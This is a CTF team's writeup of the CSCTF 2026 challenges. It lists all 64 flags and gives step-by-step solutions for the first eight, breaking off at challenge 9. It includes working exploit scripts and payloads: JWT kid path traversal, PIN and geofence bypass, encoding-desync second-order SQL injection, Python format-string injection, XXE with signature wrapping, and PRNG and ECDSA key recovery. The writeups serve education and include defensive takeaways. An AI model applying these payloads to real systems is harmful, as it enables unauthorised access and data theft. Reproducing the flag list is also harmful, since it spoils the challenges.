# CSCTF 2026 — Team Double Espresso

Writeups from [Chronos Security CSCTF 2026](https://2026.chronos-security.ro/challenges), played under team **Double Espresso**. Flag format `CSCTF{...}`.

## Index (64 challenges)

| # | Challenge | Category | Flag |
|---|---|---|---|
| 1 | [Welcome Aboard](#1-welcome-aboard) | Welcome | `CSCTF{w3lcome_aboard_operator_a17f}` |
| 2 | [Key Custody](#2-key-custody) | Web | `CSCTF{8t0GHoWKzkB1fiN7Zxkiuiiq}` |
| 3 | [Operation Dawn: The Access Log](#3-operation-dawn-the-access-log) | Web | `CSCTF{07_beacon_tow_vigil_bollard_8c0371}` |
| 4 | [Inside the Cordon](#4-inside-the-cordon) | Web | `CSCTF{HUbspEJVxRb3VDYxxskJBHMq}` |
| 5 | [Operation Dawn: The Dispatch Console](#5-operation-dawn-the-dispatch-console) | Web | `CSCTF{DW6z1JSkk8z2LBkQzID8y4fp}` |
| 6 | [Operation Dawn: The Command Seal](#6-operation-dawn-the-command-seal) | Web | `CSCTF{zg2qNI1rTQZX7JupizQ0tpHs}` |
| 7 | [The Key Wheel](#7-the-key-wheel) | Crypto | `CSCTF{15_jam_the_enemy_net_at_dawn_7e2c04}` |
| 8 | [The Signet](#8-the-signet) | Crypto | `CSCTF{canal_signet_recovered_2f17026a4a9c032f4ba186ab}` |
| 9 | [Signing Authority](#9-signing-authority) | Crypto | `CSCTF{83ar5xRYYTc2J0sJYwgo7vHE}` |
| 10 | [Countersign](#10-countersign) | Crypto | `CSCTF{AMqSHJPHUrC8ddS6x1tQDpO6}` |
| 11 | [Rollback Pair](#11-rollback-pair) | Crypto | `CSCTF{3b5789e468dadf358d375bb08dcd19b977c5715364a709326b43a35b0d5eaab1}` |
| 12 | [Harvest](#12-harvest) | Crypto | `CSCTF{PP-7_SNOP}` |
| 13 | [Operation Dawn: The Courier's Keys](#13-operation-dawn-the-couriers-keys) | Crypto | `CSCTF{01_advance_on_the_mill_a7c3f1}` |
| 14 | [Watchword](#14-watchword) | Crypto | `CSCTF{watchword_2005b4d082c8f06019960d36c5131e783d4bc532}` |
| 15 | [Emanation](#15-emanation) | Crypto | `CSCTF{relay_order_55a10bd8f06393bcc1ae8065}` |
| 16 | [Command Authority](#16-command-authority) | Reverse Engineering | `CSCTF{f96f4417c75121c3d27b039d}` |
| 17 | [Fence Shift](#17-fence-shift) | Reverse Engineering | `CSCTF{active_2bbb27_provisioned_3aa227}` |
| 18 | [Split Horizon](#18-split-horizon) | Reverse Engineering | `CSCTF{Z33OOiI4EW8QakRqhqjKtcMt}` |
| 19 | [carrier-shadow](#19-carrier-shadow) | Reverse Engineering | `CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}` |
| 20 | [HELIOS-RTU](#20-helios-rtu) | Reverse Engineering | `CSCTF{1fuJtu6jkJkctEZ1JtG5C8Rg}` |
| 21 | [Ground Lock](#21-ground-lock) | Reverse Engineering | `CSCTF{HALCYON_1B5FC6D72036689A}` |
| 22 | [PoshTerm](#22-poshterm) | Reverse Engineering | `CSCTF{4_G00D_P0W3RSH3LL_DO35_N0T_C4LL_W1K1P3D14}` |
| 23 | [Operation Dawn: Radio Recovery](#23-operation-dawn-radio-recovery) | Reverse Engineering | `CSCTF{05_train_kestrel_d48e1f}` |
| 24 | [The Layer That Wouldn't Die](#24-the-layer-that-wouldnt-die) | Forensics | `CSCTF{layer_remembers_93e33478c}` |
| 25 | [Tone Burst](#25-tone-burst) | Forensics | `CSCTF{tone_burst_4481dda445a0a227c3a8eb90fda4fd92}` |
| 26 | [Redline](#26-redline) | Forensics | `CSCTF{redline_21ee9b19d342e06432165fb2b6f64e06}` |
| 27 | [Last Buffer](#27-last-buffer) | Forensics | `CSCTF{last_buffer_4051c9f6b0d9622479785f613b063916}` |
| 28 | [Flotsam](#28-flotsam) | Forensics | `CSCTF{flotsam_0e91019a8e70267f550895930247d088}` |
| 29 | [The Capability Ghost](#29-the-capability-ghost) | Forensics | `CSCTF{fg6_x7i9b6b3nn_bj7sj}` |
| 30 | [Operation Dawn: The Medic's Phone](#30-operation-dawn-the-medics-phone) | Forensics | `CSCTF{03_at_platform_two_6f57d7}` |
| 31 | [Afterimage](#31-afterimage) | Forensics | `CSCTF{6f86acdd1d10e0d8a5a541bb}` |
| 32 | [Polyglot Requiem](#32-polyglot-requiem) | Forensics | `CSCTF{p0lygl0t_r3qu13m_1d0a73980738}` |
| 33 | [Last Commit](#33-last-commit) | Forensics | `CSCTF{last_commit_40f3b19d5a11601e9d5e5bf0c7a3bcb6248b5667764f25549b607c27396ccf5f}` |
| 34 | [Phantom Drift](#34-phantom-drift) | Forensics | `CSCTF{02202b511d115f5d}` |
| 35 | [Night Clerk](#35-night-clerk) | Forensics | `CSCTF{hid_skew_redline}` |
| 36 | [Signal Reconciliation](#36-signal-reconciliation) | Forensics | `CSCTF{EOSL5C6VZ54TN2PWXUO2B5TVHMVY5G3NWPILLYY}` |
| 37 | [Operation Dawn: The Relay Tap](#37-operation-dawn-the-relay-tap) | Forensics | `CSCTF{16_cobalt_ingot_rowan_fathom_ca8f4addb0}` |
| 38 | [Operation Dawn: Relay Snapshot](#38-operation-dawn-relay-snapshot) | Forensics | `CSCTF{20_dock_move_orchard_elm_grove_dusk_86659c}` |
| 39 | [Operation Dawn: The Burnt Server](#39-operation-dawn-the-burnt-server) | Forensics | `CSCTF{04_flint_arc_eastward_relay_6aa299}` |
| 40 | [CAPTCHA the Water Plant](#40-captcha-the-water-plant) | Forensics | `CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}` |
| 41 | [Interlock Witness](#41-interlock-witness) | Forensics | `CSCTF{1198b297c84064fab89d0f3e3e5308791165333c1b64da17185dd51493b6f339}` |
| 42 | [Briefing for One](#42-briefing-for-one) | Forensics | `CSCTF{eab85b3bb8d309ec8f52a3f6271c55ff}` |
| 43 | [Code Red Freight](#43-code-red-freight) | Forensics | `CSCTF{D3VC0DE-R3L4Y_M4N1F3ST-L3AK_4}` |
| 44 | [Dawn Array](#44-dawn-array) | Forensics | `CSCTF{dawn_12d6b2bf2703a884e970e2c4d0070c894c8cf53be91d44feabeb44e18c02eefb}` |
| 45 | [Ghost in the Historian](#45-ghost-in-the-historian) | Forensics | `CSCTF{xorshift_ghost_in_the_historian_d2c19434a637}` |
| 46 | [relic](#46-relic) | Pwn | `CSCTF{rASl77En9FhNogFdzRMJRp85}` |
| 47 | [orge](#47-orge) | Pwn | `CSCTF{jkOleWmIh1IQ4AVRho1AGdYu}` |
| 48 | [sigil](#48-sigil) | Pwn | `CSCTF{5GVl85DFVC2dxGZkI1EBZG4x}` |
| 49 | [echo_chamber](#49-echo_chamber) | Pwn | `CSCTF{GT8a3mUNrUGKEpD6qSKMY5Yc}` |
| 50 | [Water Hammer Reconciliation](#50-water-hammer-reconciliation) | Network | `CSCTF{L3LBJQQRIXYIBUFDABBXKLH2EEHWDIUZAM2R3XQ}` |
| 51 | [Dark Anchorage Reconciliation](#51-dark-anchorage-reconciliation) | Network | `CSCTF{JkQ0RIqjOsdh5zZ2GUHOlGbx}` |
| 52 | [Hard Landing](#52-hard-landing) | Network | `CSCTF{v0HpOzzY947cvrSUOPSHRVfg}` |
| 53 | [Radar Silence](#53-radar-silence) | Network | `CSCTF{rdr37_rotation_b1097f6e977015cac0297ddc3335509f}` |
| 54 | [grid-watch](#54-grid-watch) | Network | `CSCTF{GYrLKlX61Mpf1UjEfKEWzFLL}` |
| 55 | [Silent Orbit](#55-silent-orbit) | Network | `CSCTF{280069000107020800000000000000C0000000050000000600000013000000140000002300000024000000330000003400000044000000450000005300000054000000650000006600000077000000780000008A0000008B0000009A0000009B000000AB000000AC000000BB000000BC}` |
| 56 | [Operation Dawn: The Sentry's Model](#56-operation-dawn-the-sentrys-model) | Machine Learning | `CSCTF{09_the_ash_countersign_is_emberfall_4a19de}` |
| 57 | [VaultKeeper](#57-vaultkeeper) | Mobile | `CSCTF{intent_uri_and_a_broadcast_unlock_the_vault}` |
| 58 | [warden](#58-warden) | Misc | `CSCTF{AIlVhcgwUDyCz8GsRDLD7GgO}` |
| 59 | [Operation Dawn: The Shared Model](#59-operation-dawn-the-shared-model) | Misc | `CSCTF{17_hansoms_scald_not_aft_ay_gangling_1a7d12}` |
| 60 | [Command Calendar Reconciliation](#60-command-calendar-reconciliation) | Misc | `CSCTF{HbEPMTuw2BieMGB6sKF1FpSU}` |
| 61 | [Operation Dawn: Watch List Audit](#61-operation-dawn-watch-list-audit) | Misc | `CSCTF{114ca27d8c3e02e5ec872dd02b83707cae245e2f07dadaa622867cf9b3894287}` |
| 62 | [Operation Dawn: The Reconnaissance Plate](#62-operation-dawn-the-reconnaissance-plate) | Misc | `CSCTF{11_the_guns_behind_the_ridge_3f8c21}` |
| 63 | [ultralight](#63-ultralight) | Misc | `CSCTF{EUJtGJ6AWkb9NZnf4gLOY9ZN}` |
| 64 | [Operation Dawn: The Cipher Lock](#64-operation-dawn-the-cipher-lock) | Misc | `CSCTF{12_the_depot_is_unguarded_at_noon_7d3e90}` |

---

## Welcome

### 1. Welcome Aboard

**Category:** Welcome · **Difficulty:** Informational · **Points:** 100

> Welcome aboard, operator. Command sent your first transmission encoded. Decode it and report in.
>
> `Q1NDVEZ7dzNsY29tZV9hYm9hcmRfb3BlcmF0b3JfYTE3Zn0=`

**Flag:** `CSCTF{w3lcome_aboard_operator_a17f}`

---

#### Solution

The trailing `=` padding and the character set are the tell for Base64. Decode it:

```bash
echo 'Q1NDVEZ7dzNsY29tZV9hYm9hcmRfb3BlcmF0b3JfYTE3Zn0=' | base64 -d
```

```
CSCTF{w3lcome_aboard_operator_a17f}
```

A one-liner warm-up: recognise the encoding, run `base64 -d`.

---

---

## Web

### 2. Key Custody

**Category:** Web · **Difficulty:** Easy · **Points:** 193

> Vardanne Command's operations console signs each session with a JWT (HS256). You hold an analyst session; the objective is on the admin-only route `GET /admin/flag`. `GET /token` issues your session, `GET /schema` is self-describing, and the console's public brand assets are served under `/public/`. Elevate to an admin session and read the flag.

**Flag:** `CSCTF{8t0GHoWKzkB1fiN7Zxkiuiiq}`

---

#### TL;DR

The JWT verifier picks its HMAC key from the token's own `kid` header, and `kid` is a filesystem path with no sanitisation. The `/public/` brand assets are served from a sibling directory and their exact bytes are downloadable. Point `kid` at a public asset via `../public/…`, sign a forged `role=admin` token with that asset's bytes, and the signature verifies.

#### 1. Recon

`GET /` and `GET /schema` describe the service:

- Session scheme: **Bearer JWT (HS256), key selected per token `kid`**.
- `GET /token` issues an analyst session.
- `GET /public/{asset}` serves public brand assets.
- `GET /admin/recovery-key` is admin-only (the HTML's `/admin/flag` link 404s; the real route is `/admin/recovery-key`).

`GET /token`:

```json
{"sub":"analyst-recon-17","role":"analyst",
 "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCwia2lkIjoic2Vzc2lvbiJ9.…"}
```

Header decodes to `{"alg":"HS256","typ":"JWT","kid":"session"}`. The schema spells out the bug:

> the console loads each token's signing key by its `kid` (key id) header

#### 2. The vulnerability

`kid` names a **file** that the server reads and uses as the HMAC key. If I can make `kid` point to a file whose exact bytes I know, I can compute a valid HMAC myself.

The `/public/` store is a flat set of named assets. Enumerating it turns up `brand.txt`:

```bash
curl -s http://TARGET/public/brand.txt   # 201 bytes, downloadable verbatim
```

Probing the path rule shows the key loader resolves `kid` relative to a **key directory one level below the web root**, beside `public/`:

- `kid=brand.txt` → invalid
- `kid=public/brand.txt` → invalid
- `kid=../public/brand.txt` → **valid** ✓

#### 3. Forge the admin token

Download `brand.txt`, then HMAC-SHA256 a token with `kid=../public/brand.txt` and payload `{"sub":"analyst-recon-17","role":"admin"}`, keyed on the asset's bytes:

```python
import json, hmac, hashlib, base64, urllib.request
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
key  = urllib.request.urlopen("http://TARGET/public/brand.txt").read()
hdr  = {"alg":"HS256","typ":"JWT","kid":"../public/brand.txt"}
pl   = {"sub":"analyst-recon-17","role":"admin"}
seg  = b64u(json.dumps(hdr,separators=(',',':')).encode())+'.'+b64u(json.dumps(pl,separators=(',',':')).encode())
sig  = b64u(hmac.new(key, seg.encode(), hashlib.sha256).digest())
print(seg+'.'+sig)
```

```bash
curl -s -H "Authorization: Bearer <forged>" http://TARGET/admin/recovery-key
# {"recovery_key": "CSCTF{8t0GHoWKzkB1fiN7Zxkiuiiq}"}
```

#### Takeaways

- Never let the token being verified choose its own verification key. `kid` is attacker-controlled input.
- If a `kid` lookup must exist, use a fixed allow-list of key ids, never a path join, and never key material that is also served publicly.

---

### 3. Operation Dawn: The Access Log

**Category:** Web (Easy) · **Points:** 131

**Flag:** `CSCTF{07_beacon_tow_vigil_bollard_8c0371}`

#### Challenge

> One visitor walked out of the portal's database with the checkpoint's link secret and never drew an error page. Recover what they took and submit it exactly as recovered.

We're given `access.log` (514,137 bytes, SHA-256 `3bb180802cc90b56984f179cb4315fc805d1e047e8a2374544044858fea30db2`). Each line uses nginx's combined format and ends with `rt=`, the request time in seconds.

#### Analysis

##### 1. Find the odd client

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
```

```
   2666 198.51.100.66
     23 203.0.113.136
     19 192.0.2.76
     ...
```

The 2,927-line log has 2,666 requests from one IP. They all use the user agent `python-requests/2.32.3`, while the other clients are normal browsers loading `/`, `/style.css`, `/js/app.js` and so on.

##### 2. Look at the payloads

```
198.51.100.66 - - [13/Oct/2026:03:00:31 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,6,1)='Z',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=0.057
```

This is **time-based blind SQL injection**:

```sql
unit=43' AND IF(SUBSTR(token,N,1)='C', SLEEP(2), 0)-- -
```

If character `N` of `token` equals `C`, the database sleeps for 2 seconds. Otherwise it answers right away.

##### 3. Why "never drew an error page" matters

All 2,665 injection requests got **`200` with a 33-byte body**. The status code and response size are identical for every request, so they reveal nothing. The only signal is the **`rt=` request time**.

##### 4. Pull out the slow requests

```bash
grep "SUBSTR(token" access.log | python3 -c '
import sys, re, collections
hits = {}
for l in sys.stdin:
    p, c, rt = re.search(r"SUBSTR\(token,(\d+),1\)=(.*?),SLEEP.*rt=([\d.]+)", l).groups()
    if float(rt) > 1:
        hits[int(p)] = c.strip("\x27")
s = "".join(hits[i] for i in sorted(hits))
print(s.replace("%7B", "{").replace("%7D", "}"))
'
```

The response times split into two groups:

| rt (rounded) | count |
|---|---|
| 0.0 s | 2,623 |
| 0.1 s | 1 |
| **2.0 s** | **41** |

There are exactly **41 slow requests**, one for each position from 1 to 41.

##### 5. Check for traps

- **Full coverage:** at each position, all 65 candidates were tested (`A-Z`, `a-z`, `0-9`, `_`, `{`, `}`), so no character was skipped.
- **Upper vs lower case:** both cases were tested at every position, and only one of them ever caused the delay. The comparison was case-sensitive, so the letters we recovered are exact. A case-insensitive collation would have produced two hits on letter positions.
- **URL encoding:** `{` and `}` show up in the log as `%7B` and `%7D` and have to be decoded.
- **Only one attacker:** no other IP sent an injection payload.

#### Result

| Pos | 1 | 2 | 3 | 4 | 5 | 6 | 7–40 | 41 |
|---|---|---|---|---|---|---|---|---|
| Char | C | S | C | T | F | `{` | `07_beacon_tow_vigil_bollard_8c0371` | `}` |

```
CSCTF{07_beacon_tow_vigil_bollard_8c0371}
```

The token already has its `CSCTF{...}` wrapper, so it is submitted exactly as recovered.

---

### 4. Inside the Cordon

**Category:** Web · **Difficulty:** Medium · **Points:** 439

> A seized coordination station was used to get inside Cordon Seven while the national fuel corridor that feeds allied units in Operation Dawn was being rerouted. The operator PIN is gone. Reproduce the access path and recover the protected briefing.

**Flag:** `CSCTF{HUbspEJVxRb3VDYxxskJBHMq}`

---

#### TL;DR

Three server-side trust failures stacked, all because the real checks live in the browser:

1. **PIN is decided client-side** — `activate` hands out the station capability even for a *failed* PIN check.
2. **Position is attacker-supplied** — the WebSocket trusts whatever coordinates you send, so you claim to be inside the cordon.
3. **The room join the UI never sends** — while "eligible", sending `room.join` returns the briefing snapshot.

#### 1. Read the client

`app.js` drives everything and even documents the flaw:

```js
// Deliberately wrong trust boundary: the browser's local branch decides whether to activate.
```

Flow:
- `POST /api/station/pin-check {pin}` → `{success, attempt, code, expires_in_ms}`
- `POST /api/station/activate {attempt}` → station data incl. `cap`, target centre, radius
- WebSocket `/ws`: `station.authenticate{cap}` → `position.update{…}` → (handler for) `room.snapshot`

The client hard-codes a *synthetic outside* position (Point Nemo, `-47.2006,-126.3024`) and never sends a room join.

#### 2. PIN bypass

`pin-check` with a wrong PIN still returns an `attempt` token, and `activate` accepts it:

```bash
PC=$(curl -s -b cj -c cj -X POST $B/api/station/pin-check -H 'Content-Type: application/json' -d '{"pin":"000000"}')
# {"success":false,"code":"PIN_MISMATCH","attempt":"…","expires_in_ms":60000}
ATT=$(echo "$PC" | jq -r .attempt)
curl -s -b cj -c cj -X POST $B/api/station/activate -H 'Content-Type: application/json' -d "{\"attempt\":\"$ATT\"}"
# {"success":true,"cap":"…","lat_e6":-47203945,"lon_e6":-126300000,"radius_m":75,"room":"cordon-seven",…}
```

Now I hold `cap` and the target centre `-47.203945, -126.300000` (radius 75 m).

#### 3. Spoof position + join the room

Over `/ws`: authenticate, report a position **at the centre** (server trusts it → `inside:true`), then send the `room.join` the UI omits.

```python
import json, time, asyncio, websockets
async def main():
    seq=1
    async with websockets.connect(WS, additional_headers={"Cookie":cookie}, origin=BASE) as ws:
        async def send(d): await ws.send(json.dumps(d))
        await send({"type":"station.authenticate","sequence":seq,"cap":cap}); seq+=1
        m=json.loads(await ws.recv()); seq=m["next_sequence"]                 # station.accepted
        await send({"type":"position.update","sequence":seq,"observed_at_ms":int(time.time()*1000),
                    "latitude":-47.203945,"longitude":-126.300000,"accuracy_m":5.0}); seq+=1
        m=json.loads(await ws.recv()); seq=m["next_sequence"]                 # inside:true, eligible_room
        await send({"type":"room.join","sequence":seq,"room":"cordon-seven"})
        print(await ws.recv())                                               # room.snapshot → flag
asyncio.run(main())
```

```
room.snapshot … "briefing":"Convoy diversion confirmed. Preserve the access chain."
               "clearance_token":"CSCTF{HUbspEJVxRb3VDYxxskJBHMq}"
```

#### Takeaways

- A "success" branch in the browser is not authorisation. `activate` must re-verify the PIN server-side; issuing a capability on a failed check defeats the whole gate.
- Geofencing on a client-reported position is trivially spoofed. The server must derive position from a trusted source, not a WebSocket frame.
- Don't ship message handlers whose trigger the client "shouldn't" send — anyone can send any frame.

---

### 5. Operation Dawn: The Dispatch Console

**Category:** Web · **Difficulty:** Medium · **Points:** 443

> Operation Dawn, annex entry 08. We captured the Ash field dispatch console and stood it back up. A plain visitor can read and file dispatches, but the command net is locked and its standing order with it. The console runs everything past a sanitiser before it touches the database. Get command's standing order.

**Flag:** `CSCTF{DW6z1JSkk8z2LBkQzID8y4fp}`

---

#### TL;DR

A three-stage chain, each stage beating one defence:

1. **Sanitiser bypass (encoding desync):** the keyword filter inspects the *raw percent-encoded* request, but the value is URL-decoded before storage — so `%55NION`/`%53ELECT` smuggle `UNION`/`SELECT` past it.
2. **Second-order SQL injection:** `/digest` re-reads each stored `callsign` and concatenates it into a query. A UNION dumps the `operators` table → command operator token.
3. **Python format-string injection:** `/report` (now authenticated) renders the standing order through a user-supplied `.format()` template; `{dispatch.__init__.__globals__[FLAG]}` reads the flag out of module globals.

#### 1. Recon

Endpoints:

- `GET /dispatches?callsign=` — list a callsign's dispatches (parameterised).
- `POST /post {callsign, body}` — file a dispatch (sanitised, parameterised INSERT).
- `GET /digest` — per-callsign roll-up of the unit log.
- `GET /report?token=&fmt=` — renders command's standing order via a template `dispatch {dispatch.ref}: {dispatch.body}`, gated by a command token.

Probing the sanitiser (applies to every field, globally):

```
SELECT, select, UNION, union, "--"   → rejected
;  /*  */  FROM  WHERE  OR  AND  ||  → allowed
```

So it's a case-insensitive substring blacklist of `select` / `union` / `--`. `/**/` can't split a SQLite keyword (`SE/**/LECT` tokenises to `SE LECT`), so naive comment obfuscation is useless.

#### 2. Finding the injection

`/dispatches` and `/report` are parameterised (even backslash tricks fail). But a callsign containing a quote is **silently dropped from `/digest`**, and:

```
callsign = zz' OR 1=1 OR '1'='2   → /digest block shows ALL dispatches
callsign = zz' OR '1'='2          → 0
```

So `/digest` re-reads each stored callsign and concatenates it into `SELECT body FROM dispatches WHERE callsign='<cs>'` (one column, row count shown) — a classic **second-order** sink. The DB fingerprints as **SQLite** (`sqlite_version()` works in the oracle).

`dispatches` has only `id, callsign, body`; the flag and token live elsewhere. Reading another table needs `SELECT`, which the sanitiser blocks at store time too.

#### 3. The sanitiser bypass

The filter checks the **raw** request body, but the stored value is **URL-decoded**:

```
POST callsign=DEC%4fDE%54EST   → stored/displayed as "DECODETEST"
POST callsign=zz%55NION%20%53ELECT test   → FILED (filter saw "%55NION", not "UNION")
```

Encoding `U`→`%55` and `S`→`%53` (and quotes/dashes) lets `UNION SELECT` reach the database intact via the second-order sink. Helper:

```python
import urllib.parse
def enc(s):
    e = urllib.parse.quote(s, safe='')
    return (e.replace('U','%55').replace('u','%75')
             .replace('S','%53').replace('s','%73').replace('-','%2D'))
# POST  callsign=enc("<payload>")  &  body=p   (Content-Type: x-www-form-urlencoded)
```

A 1-column UNION confirms the body query shape:

```
callsign = cc1' UNION SELECT 'C0X' WHERE ''='   → /digest shows "- C0X"
```

#### 4. Dump the schema and the token

```sql
schemaz' UNION SELECT group_concat(sql,' ||| ') FROM sqlite_master WHERE ''='
```
```
CREATE TABLE operators (id INTEGER PRIMARY KEY, callsign TEXT, token TEXT, role TEXT)
CREATE TABLE dispatches (id INTEGER PRIMARY KEY, callsign TEXT, body TEXT)
```
```sql
opz' UNION SELECT group_concat(callsign||' | '||token||' | '||role,'  //  ') FROM operators WHERE ''='
```
```
EMBER  | OP-28cb8934a5fd08294953     | post
CINDER | OP-7997f4e2b27226bfda02     | post
WARDEN | AC-7870d80a056671e926dd707b | command   ← command operator token
```

#### 5. Format-string injection on /report

Authenticate with the command token; the standing order renders but isn't the flag:

```
/report?token=AC-7870d80a056671e926dd707b&fmt=dispatch {dispatch.ref}: {dispatch.body}
→ dispatch 0001: Command net quiet. Hold positions.
```

`fmt` is a Python `str.format()` template and `dispatch` is a real `__main__.Dispatch` object, so I can walk to the module globals (no `()` needed — attribute access and `[key]` indexing are enough):

```
fmt = {dispatch.__init__.__globals__[FLAG]}
```
```
CSCTF{DW6z1JSkk8z2LBkQzID8y4fp}
```

#### Full chain

```
percent-encode "x' UNION SELECT token FROM operators…"  →  POST /post (bypasses filter)
GET /digest                                             →  executes 2nd-order UNION, leaks operators.token
GET /report?token=AC-…&fmt={dispatch.__init__.__globals__[FLAG]}  →  flag
```

#### Takeaways

- **Sanitise after decoding, not before.** A filter that runs on the raw wire bytes while the app decodes later is an encoding desync waiting to happen.
- **Blacklists lose.** Parameterise queries everywhere, including values re-used later (second-order).
- **Never pass user input as a format template.** `str.format` on attacker-controlled templates reaches object attributes and module globals; use fixed templates and pass data as arguments.

---

### 6. Operation Dawn: The Command Seal

**Category:** Web · **Difficulty:** Medium · **Points:** 445

> Operation Dawn, annex entry 18. The Ash relay only acts on orders that carry command's seal, and command never puts its standing order on the wire. We can file field reports to the relay and submit orders to it, but we do not hold command's key. Make the relay give up command's standing order anyway.

**Flag:** `CSCTF{zg2qNI1rTQZX7JupizQ0tpHs}`

---

#### TL;DR

1. **XXE** in the `/report` endpoint leaks `/opt/relay/outbox/last-order.txt`, giving a genuine command-signed order (a valid `ref`/`digest`/`sig`).
2. The seal can't be forged, but the relay **verifies the order matching `<ref>` while acting on the *first* `<order>` element** — an XML signature-wrapping desync.
3. Submit a forged `kind=standing` order *before* the real sealed order; the seal validates against the real one, the relay acts on the forged one, and its `standing` kind makes the relay emit command's stored standing order.

#### 1. Recon

Two XML endpoints:

- `POST /report` — logs your `<summary>`.
- `POST /order` — acts only on orders carrying command's seal. Template:
  ```xml
  <relay><order id="..."><kind>...</kind><text>...</text></order>
  <auth><ref>...</ref><digest>...</digest><sig>...</sig></auth></relay>
  ```

The order journal is `/opt/relay/outbox/last-order.txt`.

#### 2. XXE → capture a valid seal

`/report` reflects `<summary>` and resolves external entities:

```xml
<?xml version="1.0"?>
<!DOCTYPE report [<!ENTITY xxe SYSTEM "file:///opt/relay/outbox/last-order.txt">]>
<report><summary>&xxe;</summary></report>
```

```
id=cmd-6002
kind=routine
text=hold the canal checkpoint and report at dusk
ref=cmd-6002
digest=3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=
sig=VpDbhlqKe6n0c11WnadUHSIZizDQaSuTm0CnAwuAc1KOltWx/mo0bHR/…==
```

The entity resolver is sandboxed to `file:///opt/relay/outbox/` (rejects `/etc`, `..`), so XXE alone only yields this sample — not the standing order.

#### 3. Reverse the seal

Matching the known digest shows:

```
digest = base64(SHA256("{order-id}|{kind}|{text}"))
```

Controlled experiments on `/order` (holding the body constant, changing one field):

| change | result |
|---|---|
| wrong `<order id>` | `digest does not match the signed order` |
| wrong `<ref>` (same digest+sig) | `command signature invalid` |

So the **digest binds the `<order id>`**, and the **RSA signature binds `<ref>`+digest**. Both are unforgeable without command's key — the only order I can get accepted is `cmd-6002` verbatim. Replaying it just rewrites `last-order.txt` with the same content. The standing order isn't a readable file and isn't reachable by the sandboxed XXE, so it must be emitted by the relay itself.

#### 4. Signature wrapping

The relay verifies the seal against the `<order>` whose id matches `<ref>`, but the **action handler operates on the first `<order>` element** in the document. Proof — a dummy first order is echoed while the real one is verified:

```xml
<relay>
  <order id="x"><kind>k</kind><text>t</text></order>
  <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
  <auth><ref>cmd-6002</ref><digest>…</digest><sig>…</sig></auth>
</relay>
```
→ `order acknowledged: t`  (seal checked against `cmd-6002`, acted on the first order).

Set the first order's `kind` to `standing`:

```xml
<relay>
  <order id="standing"><kind>standing</kind><text>x</text></order>
  <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
  <auth><ref>cmd-6002</ref><digest>3285…ueM=</digest><sig>VpDb…FOw==</sig></auth>
</relay>
```

```
command standing order honoured: CSCTF{zg2qNI1rTQZX7JupizQ0tpHs}
```

The seal passes against `cmd-6002`; the relay acts on the first order; its `standing` kind releases command's stored standing order.

#### Takeaways

- Verify and act on the **same** element. Signature-wrapping (XSW) happens whenever the verifier and the business logic disagree about which node is authoritative.
- Disable external entity resolution (XXE) on every XML parser. A directory sandbox only narrows the blast radius.
- A signed digest that covers only *part* of a request (here the order id + a separate ref) leaves the rest free to manipulate.

---

---

## Crypto

### 7. The Key Wheel

**Flag:** CSCTF{15_jam_the_enemy_net_at_dawn_7e2c04}

#### Scheme
The "register" is an **MT19937** stream of 32-bit words. For transmission `t`:
- key = concat(uint32be(word)) over register outputs `[8t, 8t+8)`  (8 words = 32-byte key)
- keystream = concat( SHA-256(key || uint32be(i)) ) for i=0,1,...
- plaintext = ciphertext XOR keystream

`window_opens_tx = 156`, so `register[j]` = global MT output index `1248 + j`
(1248 = 8*156 = 2*624, a twist-block boundary). The standing order is **tx 155**,
whose key words are outputs `1240..1247` — one MT block *before* the recorded window.

#### Attack: run the MT "key wheel" backwards
1. `untemper` the first 624 recorded words -> state S2 (block that outputs 1248..).
   (Verified: `twist(S2)` == untemper(next 624) == S3.)
2. **Reverse one twist**: recover all `y_i` from the post-twist array
   (for i>=227, C_i = new[i-227]; for i<227, C_i = old[i+397], already recovered),
   then `old[i] = (y_i & 0x80000000) | (y_{i-1} & 0x7fffffff)` -> S1 = untwist(S2).
   Word 0's low 31 bits are unrecoverable (MT only uses its top bit) but irrelevant.
   Validated with `twist(S1) == S2`.
3. tx-155 key words = `temper(S1[616..624])` = outputs 1240..1247.
4. Derive key/keystream and XOR -> flag. (In-window dispatches 156-161 also decrypt
   to sensible text, confirming the whole pipeline.)

#### Fix
Don't key dispatches from a reversible PRNG whose outputs/state leak; MT19937 is fully
invertible (untemper + reverse-twist). Use a forward-secure KDF/ratchet.

---

### 8. The Signet

**Flag:** CSCTF{canal_signet_recovered_2f17026a4a9c032f4ba186ab}

#### Vuln: ECDSA linear-nonce (arithmetic-progression) key recovery
case-note: the entropy sampler stopped, so consecutive signing nonces advanced by a
fixed additive stride: `k_i = k_0 + i*stride (mod n)` over secp256k1, SHA-256.

For ECDSA: `s_i = k_i^{-1}(z_i + r_i*d)` → `k_i = s_i^{-1} z_i + s_i^{-1} r_i * d = A_i + B_i*d`,
which is **linear in d**. A fixed stride means the second difference of k vanishes:
`k_{i+2} - 2 k_{i+1} + k_i = 0`, so
```
d = -(A_{i+2} - 2A_{i+1} + A_i) * (B_{i+2} - 2B_{i+1} + B_i)^{-1}  (mod n)
```
Six signatures give 4 independent triples — all yielded the same d (cross-check).
`z_i = int_be(SHA256(message_i)) mod n`.

Recovered `d = 0x79c7842bf8177446127be0061bfb456d8c99811601cf3f86187b1a3b45b59d8f`.

#### Decrypt the seal
- IKM = I2OSP(d, 32) (32-byte big-endian d)
- key = HKDF-SHA256(IKM, salt=seal.salt, info="CSCTF26/TheSignet/v1/standing-order", L=32)
- AES-256-GCM(key, nonce=seal.nonce, ct=seal.ciphertext, tag=seal.tag, AAD=empty) -> UTF-8 flag

Run: `python3 solve.py`

#### Fix
Use RFC 6979 deterministic nonces (or a proper CSPRNG); never let nonces share a
known linear relation — any affine relation across signatures leaks the private key.

---

### 9. Signing Authority

**Flag:** `CSCTF{83ar5xRYYTc2J0sJYwgo7vHE}`

#### Target
`http://w03.ctf.chronos-security.ro:33350` — a secp256k1 ECDSA code-signing API. It
signs release *receipts* but refuses to sign the one "master arming" message. Routes:
